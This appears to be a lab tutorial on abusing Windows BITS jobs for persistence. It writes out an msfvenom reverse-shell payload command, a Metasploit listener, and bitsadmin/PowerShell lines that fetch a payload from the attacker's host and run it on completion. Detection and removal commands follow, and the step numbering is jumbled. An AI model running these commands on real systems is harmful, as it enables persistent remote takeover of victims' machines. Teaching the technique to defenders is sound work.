# Exploiting BITS Jobs for Persistence

## 1. Introduction

Background Intelligent Transfer Service (BITS) is a Windows service designed for low-bandwidth, asynchronous file transfers. It is commonly used by Windows Update, messaging applications, and other background services that require efficient file transfer without disrupting network performance. However, adversaries can abuse BITS jobs for malicious purposes, including persistent code execution, downloading and executing payloads, and exfiltrating data.

---

## 2. Understanding BITS Jobs and Why They Are Exploitable

BITS operates by creating and managing jobs that handle file transfers. These jobs can be configured to:
- Download and execute files
- Run commands upon completion or failure
- Store job configurations in a database, avoiding registry modifications
- Persist across reboots with a default maximum lifetime of 90 days (extendable)

The BITS interface can be accessed via:
- PowerShell (`Start-BitsTransfer`, `Get-BitsTransfer`)
- BITSAdmin tool (`bitsadmin /transfer`)

Since BITS jobs are often allowed by host firewalls and do not create obvious new files, they provide a stealthy mechanism for attackers to execute malicious code and maintain persistence on a target system.

---

## 3. Attack Scenario: Persistence via BITS Jobs

### 3.1. Lab Setup

This attack is demonstrated in a controlled lab environment using VMware Workstation. The setup consists of:
- **Attacker:** Kali Linux : 192.168.100.10 (running Metasploit Framework)
- **Victim:** Windows 10: 192.168.1.11 (BITS service enabled)
- **Network Configuration:** NAT

### 3.2. Attack Execution

#### Step 1: Using Metasploit to create payload
On Kali Linux, open a terminal and generate a malicious executable:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=4444 -f exe > /tmp/payload.exe
```
#### Step 3: Send Payload through Python HTTP Server
```bash
cd /tmp
python3 -m http.server 8080
```
Setting Up a Listener on Kali Linux

To capture the reverse shell, the attacker sets up a Metasploit listener:
```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.100.10
set LPORT 4444
exploit
```
When the victim executes the payload, a Meterpreter session is established, giving the attacker control over the compromised system.
#### Step 2: Creating a Malicious BITS Job

On the compromised Windows machine, the attacker executes PowerShell commands to create a persistent BITS job:
```powershell
$job = Start-BitsTransfer -Source "http://192.168.100.10:8080/payload.exe" -Destination "C:\Users\Public\payload.exe"
bitsadmin /create /download MaliciousJob
bitsadmin /addfile MaliciousJob "http://attacker-server/payload.exe" "C:\Users\Public\payload.exe"
bitsadmin /setnotifycmdline MaliciousJob "C:\Users\Public\payload.exe" ""
bitsadmin /resume MaliciousJob
```
This command sequence:
- Downloads a payload from the attacker's server
- Saves it to a writable directory (`C:\Users\Public\`)
- Configures the job to execute the payload once the transfer is complete
- Resumes the job to trigger execution

#### Step 3: Achieving Persistence

Since BITS jobs persist in the system’s job queue, they remain active even after reboots. To confirm persistence, the attacker can run:
```powershell
Get-BitsTransfer | Format-Table -AutoSize
```
If the system is restarted, the job will still exist, allowing the payload to be re-executed.

---


## 4. Detecting and Mitigating BITS Job Abuse

### 4.1. Detection

Administrators can monitor for suspicious BITS jobs by running:
```powershell
Get-BitsTransfer -AllUsers | Select-Object -Property DisplayName, JobState, Owner, TransferType, NotifyCmdLine
```
Additionally, security logs and endpoint detection tools can help identify unexpected BITS activity.

### 4.2. Mitigation

To remove suspicious BITS jobs, execute:
```powershell
Get-BitsTransfer | Remove-BitsTransfer
```
To further secure the system:
- Restrict BITS job creation to trusted applications using Group Policy
- Monitor and log BITS activity for anomalous behavior
- Use application whitelisting to prevent unauthorized execution

---

## 5. Conclusion

BITS Job Persistence is a stealthy technique that attackers can use to maintain access on a Windows system. By leveraging the native BITS service, adversaries can execute payloads, evade detection, and maintain persistence without modifying the registry or creating new scheduled tasks. Understanding this technique is crucial for defenders to detect and mitigate such attacks effectively.
